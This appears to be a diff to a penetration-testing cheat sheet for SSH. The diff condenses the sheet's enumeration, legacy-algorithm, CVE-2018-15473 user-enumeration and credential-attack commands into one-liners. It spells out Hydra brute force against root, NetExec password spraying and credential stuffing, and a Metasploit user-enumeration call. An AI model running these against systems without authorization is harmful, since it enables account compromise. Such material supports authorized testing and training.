@@ -16,88 +16,70 @@
 
 ## Enumeration
 
-### Banner Grabbing
+### Quick Check (One-liner)
 
 ```shell
-# Using netcat
-nc -vn $rhost 22
-
-# SSH audit tool
-ssh-audit $rhost
-
-# Get SSH version
-ssh -v $rhost 2>&1 | head -20
+nc -vn $rhost 22 && nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos $rhost
 ```
 
-### Nmap Scripts
+### Banner Grabbing (One-liner)
 
 ```shell
-# Service detection
-nmap -p 22 -sV $rhost
+# Quick banner + version
+nc -vn $rhost 22 2>&1 | head -1 && ssh -o BatchMode=yes -o ConnectTimeout=3 $rhost 2>&1 | grep -i 'ssh'
 
-# Identify authentication methods
-nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" $rhost
-
-# SSH hostkey fingerprint
-nmap -p 22 --script ssh-hostkey $rhost
-
-# Check algorithms
-nmap -p 22 --script ssh2-enum-algos $rhost
+# SSH audit (comprehensive)
+ssh-audit $rhost 2>/dev/null | head -30
 ```
 
-### Legacy Algorithms
-
-> For connecting to older SSH servers
+### Nmap Scripts (One-liner)
 
 ```shell
-# Legacy host key algorithm
-ssh -o "HostKeyAlgorithms=+ssh-rsa" -o "PubkeyAcceptedAlgorithms=+ssh-rsa" user@$rhost
+# All SSH scripts in one command
+nmap -p 22 -sV --script "ssh-*" $rhost
 
-# Old key exchange algorithm
-ssh -o "KexAlgorithms=+diffie-hellman-group1-sha1" -o "HostKeyAlgorithms=+ssh-rsa" user@$rhost
-
-# Combined legacy options
-ssh -o "KexAlgorithms=+diffie-hellman-group1-sha1" \
-    -o "HostKeyAlgorithms=+ssh-rsa" \
-    -o "PubkeyAcceptedAlgorithms=+ssh-rsa" user@$rhost
+# Quick enumeration
+nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos,ssh-hostkey --script-args="ssh.user=root" $rhost
 ```
 
-### User Enumeration
-
-> CVE-2018-15473 - OpenSSH < 7.7
+### Legacy Algorithms (One-liner)
 
 ```shell
-# Metasploit
-use auxiliary/scanner/ssh/ssh_enumusers
-set RHOSTS $rhost
-set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
-run
+# Connect to old SSH servers (combined legacy options)
+ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@$rhost
+```
 
-# Python script
-python3 ssh_user_enum.py $rhost -u root
+### User Enumeration (CVE-2018-15473)
+
+```shell
+# Metasploit one-liner
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $rhost; set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt; run; exit"
 ```
 
 ---
 
-## Brute Force
+## Brute Force (One-liner)
 
 ### Hydra
 
 ```shell
-# Single user
-hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$rhost
+# Single user brute force
+hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://$rhost
 
-# Multiple users
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$rhost
-
-# Rate limited
-hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$rhost
+# User list + password list
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://$rhost
 ```
 
 ### NetExec
 
 ```shell
-# Default credentials
+# Password spray
+nxc ssh $rhost -u users.txt -p 'Password123!' --continue-on-success
+
+# Credential stuffing
+nxc ssh $rhost -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+
+# Brute force
 nxc ssh $rhost -u users.txt -p passwords.txt
 
 # With default credential list
